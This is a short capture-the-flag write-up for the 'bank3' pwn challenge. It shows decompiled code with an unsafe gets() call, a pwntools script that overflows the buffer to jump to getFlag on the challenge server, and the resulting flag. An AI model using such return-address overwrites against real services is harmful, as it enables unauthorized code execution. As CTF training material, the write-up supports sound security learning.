## bank3 (100 points)

#### Solved by hieplpvip

```
nc 61.28.237.24 30204

author: xikhud
```

`bank3` is very similar to `bank2`, except that the part which calls `getFlag` is removed:

```cpp
void Register()
{
  char name[64]; // [esp+Ch] [ebp-4Ch]
  int balance; // [esp+4Ch] [ebp-Ch]

  balance = 0;
  printf("[+] Please enter your name: ");
  gets(name);
  printf("[+] Thanks for the registration, your balance is %d.\n", balance);
}
```

We exploit buffer overflow to overwrite the return address with the address of `getFlag`:

```py
from pwn import *
elf = ELF('./bank3')
conn = remote('61.28.237.24', 30204)
conn.sendlineafter('name:', b'a' * 80 + p32(elf.symbols['getFlag']))
conn.interactive()
```

**Flag:** `HCMUS-CTF{overwrite_all_the_things}`
